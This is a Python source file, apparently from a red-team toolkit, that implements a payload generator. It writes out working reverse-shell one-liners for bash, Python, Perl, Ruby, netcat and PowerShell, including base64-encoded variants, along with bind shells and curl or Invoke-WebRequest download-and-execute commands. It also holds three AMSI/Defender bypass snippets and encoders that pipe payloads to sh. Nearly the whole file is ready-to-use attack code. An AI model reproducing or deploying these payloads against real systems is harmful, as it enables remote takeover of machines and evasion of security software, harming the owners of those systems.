"""
ORDL RED TEAM - PAYLOAD GENERATOR
Classification: TOP SECRET//SCI//NOFORN

Advanced payload generation capabilities:
- Multi-platform shellcode
- Staged and stageless payloads
- Evasion techniques (encoders, encryption)
- AMSI/Defender bypass
- Custom payload templates
- One-liners for various platforms
"""

import base64
import logging
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import random
import string

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Types of payloads"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    DOWNLOAD_EXECUTE = "download_execute"
    COMMAND_EXEC = "command_exec"
    KEYLOGGER = "keylogger"
    SCREENSHOT = "screenshot"
    CREDENTIAL_HARVESTER = "credential_harvester"
    PERSISTENCE = "persistence"
    LATERAL_MOVEMENT = "lateral_movement"


class PayloadPlatform(Enum):
    """Target platforms"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    PYTHON = "python"
    POWERSHELL = "powershell"
    BASH = "bash"
    PERL = "perl"
    RUBY = "ruby"


class PayloadArch(Enum):
    """Target architectures"""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"


class PayloadFormat(Enum):
    """Output formats"""
    RAW = "raw"
    EXECUTABLE = "exe"
    DLL = "dll"
    PYTHON = "py"
    POWERSHELL = "ps1"
    BASH = "sh"
    PERL = "pl"
    RUBY = "rb"
    JAR = "jar"
    APK = "apk"
    MACHO = "macho"
    ELF = "elf"


@dataclass
class Payload:
    """Represents a generated payload"""
    payload_id: str
    name: str
    description: str
    payload_type: PayloadType
    platform: PayloadPlatform
    arch: PayloadArch
    format: PayloadFormat
    content: bytes = b""
    content_b64: str = ""
    one_liner: str = ""
    size: int = 0
    md5_hash: str = ""
    sha256_hash: str = ""
    detection_rate: float = 0.0  # Estimated AV detection rate
    encoding: str = "none"
    options: Dict = field(default_factory=dict)
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class Listener:
    """Payload callback listener"""
    listener_id: str
    name: str
    protocol: str  # tcp, http, https, dns
    host: str
    port: int
    payload_type: str
    status: str = "stopped"  # running, stopped
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    sessions: List[str] = field(default_factory=list)


class PayloadGenerator:
    """
    Advanced payload generation system.
    Creates payloads for various platforms with evasion capabilities.
    """
    
    def __init__(self, redteam_manager=None):
        self.rt_manager = redteam_manager
        self.payloads: Dict[str, Payload] = {}
        self.listeners: Dict[str, Listener] = {}
        self.payload_counter = 0
        self.listener_counter = 0
        
        # Common ports for listeners
        self.common_ports = [4444, 5555, 8080, 443, 80, 1234, 9999, 31337]
        
    def _generate_id(self, prefix: str) -> str:
        """Generate unique ID"""
        self.payload_counter += 1
        return f"{prefix}-{self.payload_counter:06d}"
    
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate random string for evasion"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def generate_reverse_shell(self, platform: PayloadPlatform,
                               arch: PayloadArch = PayloadArch.X64,
                               lhost: str = "127.0.0.1", 
                               lport: int = 4444,
                               format: PayloadFormat = PayloadFormat.RAW,
                               encoder: str = None) -> Payload:
        """
        Generate reverse shell payload.
        
        Args:
            platform: Target platform
            arch: Target architecture
            lhost: Callback IP
            lport: Callback port
            format: Output format
            encoder: Encoding method (x64, xor, base64)
        
        Returns:
            Payload object
        """
        payload_id = self._generate_id("PAYLOAD")
        
        content = b""
        one_liner = ""
        
        if platform == PayloadPlatform.LINUX:
            content, one_liner = self._linux_reverse_shell(lhost, lport, format)
        elif platform == PayloadPlatform.WINDOWS:
            content, one_liner = self._windows_reverse_shell(lhost, lport, format)
        elif platform == PayloadPlatform.MACOS:
            content, one_liner = self._macos_reverse_shell(lhost, lport, format)
        elif platform == PayloadPlatform.PYTHON:
            content, one_liner = self._python_reverse_shell(lhost, lport)
        elif platform == PayloadPlatform.POWERSHELL:
            content, one_liner = self._powershell_reverse_shell(lhost, lport)
        elif platform == PayloadPlatform.BASH:
            content, one_liner = self._bash_reverse_shell(lhost, lport)
        elif platform == PayloadPlatform.PERL:
            content, one_liner = self._perl_reverse_shell(lhost, lport)
        elif platform == PayloadPlatform.RUBY:
            content, one_liner = self._ruby_reverse_shell(lhost, lport)
        
        # Apply encoding if requested
        if encoder:
            content, one_liner = self._apply_encoding(content, one_liner, encoder)
        
        import hashlib
        
        # Handle OpenSSL compatibility issues
        try:
            md5_hash = hashlib.md5(content).hexdigest()
        except Exception:
            md5_hash = "unknown"
        
        try:
            sha256_hash = hashlib.sha256(content).hexdigest()
        except Exception:
            sha256_hash = "unknown"
        
        payload = Payload(
            payload_id=payload_id,
            name=f"Reverse Shell ({platform.value})",
            description=f"Connects back to {lhost}:{lport}",
            payload_type=PayloadType.REVERSE_SHELL,
            platform=platform,
            arch=arch,
            format=format,
            content=content,
            content_b64=base64.b64encode(content).decode(),
            one_liner=one_liner,
            size=len(content),
            md5_hash=md5_hash,
            sha256_hash=sha256_hash,
            encoding=encoder or "none",
            options={
                "lhost": lhost,
                "lport": lport,
                "encoder": encoder
            }
        )
        
        self.payloads[payload_id] = payload
        logger.info(f"[Payload] Generated reverse shell: {payload_id}")
        
        return payload
    
    def _linux_reverse_shell(self, lhost: str, lport: int,
                             format: PayloadFormat) -> Tuple[bytes, str]:
        """Generate Linux reverse shell"""
        
        if format == PayloadFormat.BASH:
            one_liner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            return one_liner.encode(), one_liner
        
        elif format == PayloadFormat.PYTHON:
            code = f'''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
            return code.encode(), f"python3 -c '{code}'"
        
        elif format == PayloadFormat.PERL:
            code = f'''use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'''
            return code.encode(), f"perl -e '{code}'"
        
        elif format == PayloadFormat.RUBY:
            code = f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)''' 
            return code.encode(), code
        
        else:  # Raw - netcat
            one_liner = f"nc -e /bin/sh {lhost} {lport}"
            return one_liner.encode(), one_liner
    
    def _windows_reverse_shell(self, lhost: str, lport: int,
                               format: PayloadFormat) -> Tuple[bytes, str]:
        """Generate Windows reverse shell"""
        
        if format == PayloadFormat.POWERSHELL:
            ps_code = f'''
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
            # Minified version
            one_liner = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};\""
            return ps_code.encode(), one_liner
        
        elif format == PayloadFormat.PYTHON:
            code = f'''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"])'''
            return code.encode(), f"python.exe -c \"{code}\""
        
        else:
            # PowerShell base64 encoded
            ps = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
            encoded = base64.b64encode(ps.encode('utf-16le')).decode()
            one_liner = f"powershell -nop -enc {encoded}"
            return ps.encode(), one_liner
    
    def _macos_reverse_shell(self, lhost: str, lport: int,
                             format: PayloadFormat) -> Tuple[bytes, str]:
        """Generate macOS reverse shell"""
        # Similar to Linux
        return self._linux_reverse_shell(lhost, lport, format)
    
    def _python_reverse_shell(self, lhost: str, lport: int) -> Tuple[bytes, str]:
        """Generate Python reverse shell"""
        code = f'''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
        return code.encode(), f"python3 -c '{code}'"
    
    def _powershell_reverse_shell(self, lhost: str, lport: int) -> Tuple[bytes, str]:
        """Generate PowerShell reverse shell"""
        ps = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
        encoded = base64.b64encode(ps.encode('utf-16le')).decode()
        one_liner = f"powershell -nop -enc {encoded}"
        return ps.encode(), one_liner
    
    def _bash_reverse_shell(self, lhost: str, lport: int) -> Tuple[bytes, str]:
        """Generate Bash reverse shell"""
        one_liner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return one_liner.encode(), one_liner
    
    def _perl_reverse_shell(self, lhost: str, lport: int) -> Tuple[bytes, str]:
        """Generate Perl reverse shell"""
        code = f'''use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'''
        return code.encode(), f"perl -e '{code}'"
    
    def _ruby_reverse_shell(self, lhost: str, lport: int) -> Tuple[bytes, str]:
        """Generate Ruby reverse shell"""
        code = f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)''' 
        return code.encode(), code
    
    def _apply_encoding(self, content: bytes, one_liner: str,
                       encoder: str) -> Tuple[bytes, str]:
        """Apply encoding to payload"""
        
        if encoder == "base64":
            encoded = base64.b64encode(content).decode()
            return content, f"echo {encoded} | base64 -d | sh"
        
        elif encoder == "xor":
            key = random.randint(1, 255)
            xor_bytes = bytes(b ^ key for b in content)
            return xor_bytes, one_liner
        
        elif encoder == "hex":
            hex_str = content.hex()
            return content, f"echo {hex_str} | xxd -r -p | sh"
        
        return content, one_liner
    
    def generate_bind_shell(self, platform: PayloadPlatform,
                           port: int = 4444,
                           format: PayloadFormat = PayloadFormat.BASH) -> Payload:
        """Generate bind shell payload"""
        payload_id = self._generate_id("PAYLOAD")
        
        content = b""
        one_liner = ""
        
        if platform == PayloadPlatform.LINUX:
            one_liner = f"nc -lvp {port} -e /bin/sh"
            content = one_liner.encode()
        
        elif platform == PayloadPlatform.WINDOWS:
            ps = f"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
            content = ps.encode()
            one_liner = f"powershell -nop -c \"{ps}\""
        
        elif platform == PayloadPlatform.PYTHON:
            code = f'''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
            content = code.encode()
            one_liner = f"python3 -c '{code}'"
        
        import hashlib
        
        # Handle OpenSSL compatibility issues
        try:
            md5_hash = hashlib.md5(content).hexdigest()
        except Exception:
            md5_hash = "unknown"
        
        try:
            sha256_hash = hashlib.sha256(content).hexdigest()
        except Exception:
            sha256_hash = "unknown"
        
        payload = Payload(
            payload_id=payload_id,
            name=f"Bind Shell ({platform.value})",
            description=f"Listens on port {port}",
            payload_type=PayloadType.BIND_SHELL,
            platform=platform,
            arch=PayloadArch.X64,
            format=format,
            content=content,
            content_b64=base64.b64encode(content).decode(),
            one_liner=one_liner,
            size=len(content),
            md5_hash=md5_hash,
            sha256_hash=sha256_hash,
            options={"port": port}
        )
        
        self.payloads[payload_id] = payload
        return payload
    
    def generate_download_execute(self, platform: PayloadPlatform,
                                  url: str,
                                  execute: bool = True) -> Payload:
        """Generate download-and-execute payload"""
        payload_id = self._generate_id("PAYLOAD")
        
        content = b""
        one_liner = ""
        
        if platform == PayloadPlatform.WINDOWS:
            filename = url.split('/')[-1]
            if execute:
                one_liner = f"powershell -c \"Invoke-WebRequest -Uri '{url}' -OutFile '{filename}'; Start-Process '{filename}'\""
            else:
                one_liner = f"powershell -c \"Invoke-WebRequest -Uri '{url}' -OutFile '{filename}'\""
            content = one_liner.encode()
        
        elif platform == PayloadPlatform.LINUX:
            filename = url.split('/')[-1]
            if execute:
                one_liner = f"curl -sL '{url}' -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
            else:
                one_liner = f"curl -sL '{url}' -o /tmp/{filename}"
            content = one_liner.encode()
        
        import hashlib
        
        payload = Payload(
            payload_id=payload_id,
            name=f"Download & Execute ({platform.value})",
            description=f"Downloads from {url}",
            payload_type=PayloadType.DOWNLOAD_EXECUTE,
            platform=platform,
            arch=PayloadArch.X64,
            format=PayloadFormat.BASH,
            content=content,
            content_b64=base64.b64encode(content).decode(),
            one_liner=one_liner,
            size=len(content),
            md5_hash=hashlib.md5(content).hexdigest(),
            sha256_hash=hashlib.sha256(content).hexdigest(),
            options={"url": url, "execute": execute}
        )
        
        self.payloads[payload_id] = payload
        return payload
    
    def generate_amsi_bypass(self) -> str:
        """Generate AMSI bypass for Windows Defender"""
        
        # Common AMSI bypass techniques
        bypasses = [
            # Technique 1: Memory patch
            '''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)''',
            
            # Technique 2: Base64 encoded patch
            '''[Reflection.Assembly]::LoadWithPartialName("System.Management.Automation").GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)''',
            
            # Technique 3: Forcing error
            '''$id = Get-Random;New-Item -Path "HKLM:\\Software\\Classes\\CLSID\\{$id}" -Value "test";Remove-Item -Path "HKLM:\\Software\\Classes\\CLSID\\{$id}";[System.Reflection.Assembly]::GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$id)'''
        ]
        
        return random.choice(bypasses)
    
    def create_listener(self, name: str, protocol: str, 
                       host: str, port: int,
                       payload_type: str = "reverse_shell") -> Listener:
        """
        Create a listener for incoming connections.
        
        Args:
            name: Listener name
            protocol: tcp, http, https
            host: Bind address
            port: Port to listen on
            payload_type: Expected payload type
        
        Returns:
            Listener object
        """
        self.listener_counter += 1
        listener_id = f"LISTENER-{self.listener_counter:04d}"
        
        listener = Listener(
            listener_id=listener_id,
            name=name,
            protocol=protocol,
            host=host,
            port=port,
            payload_type=payload_type
        )
        
        self.listeners[listener_id] = listener
        logger.info(f"[Payload] Listener created: {listener_id} ({host}:{port})")
        
        return listener
    
    def start_listener(self, listener_id: str) -> bool:
        """Start a listener"""
        listener = self.listeners.get(listener_id)
        if not listener:
            return False
        
        # In real implementation, this would start the actual listener
        listener.status = "running"
        logger.info(f"[Payload] Listener started: {listener_id}")
        return True
    
    def stop_listener(self, listener_id: str) -> bool:
        """Stop a listener"""
        listener = self.listeners.get(listener_id)
        if not listener:
            return False
        
        listener.status = "stopped"
        logger.info(f"[Payload] Listener stopped: {listener_id}")
        return True
    
    def list_listeners(self) -> List[Listener]:
        """List all listeners"""
        return list(self.listeners.values())
    
    def get_payload(self, payload_id: str) -> Optional[Payload]:
        """Get payload by ID"""
        return self.payloads.get(payload_id)
    
    def list_payloads(self) -> List[Payload]:
        """List all generated payloads"""
        return list(self.payloads.values())
    
    def delete_payload(self, payload_id: str) -> bool:
        """Delete a payload"""
        if payload_id in self.payloads:
            del self.payloads[payload_id]
            return True
        return False
    
    def get_statistics(self) -> Dict:
        """Get payload generator statistics"""
        return {
            "total_payloads": len(self.payloads),
            "active_listeners": len([l for l in self.listeners.values() if l.status == "running"]),
            "total_listeners": len(self.listeners),
            "payloads_by_platform": {}
        }


__all__ = [
    'PayloadGenerator',
    'Payload',
    'Listener',
    'PayloadType',
    'PayloadPlatform',
    'PayloadArch',
    'PayloadFormat'
]
